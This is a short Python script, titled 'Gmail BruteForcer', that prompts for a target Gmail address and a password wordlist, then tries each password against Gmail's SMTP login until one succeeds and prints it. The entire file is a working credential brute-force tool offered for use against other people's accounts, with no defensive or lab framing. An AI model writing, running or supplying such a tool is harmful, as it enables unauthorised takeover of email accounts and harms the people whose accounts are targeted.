#!/usr/bin/env python3

import smtplib
from termcolor import colored

print('''
        ################################
        #      Gmail BruteForcer       #
        #                              #
        #   Developed by Sheinn Khant  #
        ################################


     ''')


smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

email = input("[*] Enter Target Email Address : ")
passwdfile = input("[*] Enter Wordlist for Bruteforce : ")

file = open(passwdfile, 'r')

for password in file:
    password = password.strip('\n')

    try:
        smtpserver.login(email, password)
        print(colored("[+] Password Found : %s" % password, 'green'))
        break
    except smtplib.SMTPAuthenticationError:
        print(colored("[-] Wrong Passowrd : " + password, 'red'))
